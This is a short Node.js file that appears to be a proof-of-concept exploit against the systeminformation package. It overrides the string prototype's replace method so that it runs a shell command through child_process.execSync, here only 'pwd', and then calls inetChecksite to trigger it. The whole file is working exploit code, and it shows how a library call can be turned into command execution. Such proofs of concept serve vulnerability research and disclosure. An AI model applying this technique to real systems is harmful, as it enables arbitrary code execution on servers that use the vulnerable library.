const si = require('systeminformation');

exports.exploit = function(req, res){
    const obj = "";

    obj.__proto__.replace = () => { return require("child_process").execSync("pwd") };
    
    si.inetChecksite("https://effectrenan.com");

    res.end()

}
